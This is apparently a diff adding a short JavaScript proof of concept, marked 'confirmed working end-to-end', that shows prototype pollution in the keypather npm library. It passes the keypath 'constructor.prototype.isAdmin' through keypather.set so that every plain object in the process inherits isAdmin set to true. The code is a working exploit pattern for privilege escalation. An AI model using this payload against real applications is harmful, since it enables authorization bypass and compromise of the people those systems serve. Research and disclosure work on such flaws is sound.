@@ -1,0 +1,15 @@
+Confirmed working end-to-end.
+
+```javascript
+const keypather = require("./node_modules/keypather")();
+
+// Simulate an app that sets a user-controlled keypath on some object
+const userInput = { path: "constructor.prototype.isAdmin", value: true };
+const someAppObject = {};
+
+keypather.set(someAppObject, userInput.path, userInput.value);
+
+// Any plain object in the whole process is now polluted
+const victim = {};
+console.log("victim.isAdmin =", victim.isAdmin); // true -> prototype pollution confirmed
+```
